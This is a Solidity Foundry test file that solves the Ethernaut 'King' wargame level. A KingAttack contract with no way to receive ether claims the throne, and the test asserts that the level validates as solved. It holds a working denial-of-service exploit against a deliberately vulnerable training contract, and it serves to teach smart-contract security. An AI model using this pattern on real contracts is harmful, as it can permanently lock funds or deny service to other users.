pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import "src/core/Ethernaut.sol";
import "src/levels/09King/King.sol";
import "src/levels/09King/KingFactory.sol";

contract KingAttack{
    King kingInstance;
    constructor(King _kingInstance){
        kingInstance = _kingInstance;
    }

    function exploitContract() public{
        (bool result,) = payable(address(kingInstance)).call{value: 0.01 ether}("");
    }
}

contract TestKing is Test{
    Ethernaut ethernaut = new Ethernaut();
    address myEoaAddress = 0xB5Da00630Ca5fdE4d9cED2fcdA0C607cE198F159;
    function setUp() public {
        vm.deal(myEoaAddress, 1000 ether);
    }

    function testKing() public{
        KingFactory kingFactory = new KingFactory();
        ethernaut.registerLevel(kingFactory);
        vm.startPrank(myEoaAddress);
        address kingInstanceAddress = ethernaut.createLevelInstance{value: 0.0011 ether}(kingFactory);
        King kingInstance = King(payable(kingInstanceAddress));
        emit log_named_address("Owner: ", kingInstance.owner());
        emit log_named_address("Emitter: ", address(kingFactory));
        emit log_named_address("King: ", kingInstance._king());
        KingAttack kingAttack = new KingAttack(kingInstance);
        vm.deal(address(kingAttack), 1 ether);
        kingAttack.exploitContract();
        vm.stopPrank();
        bool result = kingFactory.validateInstance(payable(kingInstance), myEoaAddress);
        assertTrue(result);
    }
}